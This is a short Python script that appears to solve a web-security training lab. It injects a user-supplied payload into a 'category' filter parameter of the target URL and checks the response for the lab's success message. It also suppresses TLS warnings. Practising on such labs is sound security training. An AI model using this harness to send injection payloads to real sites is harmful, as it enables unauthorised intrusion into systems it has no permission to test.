#!/usr/bin/python3

import requests, urllib3
import sys
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def req(url, payload):
    vuln_path = url+"/filter?category="+payload
    r = requests.get(url=vuln_path)
    time.sleep(5)
    if 'Congratulations, you solved the lab!' in r.text:
        print("Exploited Succesfull!")
    else :
        print("failed try again...")

def check(url, payload):
    if 'https://' in url:
        print("Exploiting...")
        req(url,payload)
    else :
        print("Invalid Url")

def main():
    if len(sys.argv) !=3 :
        print("[+] Usage:  %s <url> <paylaod>" % sys.argv[0])
        sys.exit(1)
    url = sys.argv[1]
    payload = sys.argv[2]
    check(url, payload)


if __name__=="__main__":
     main()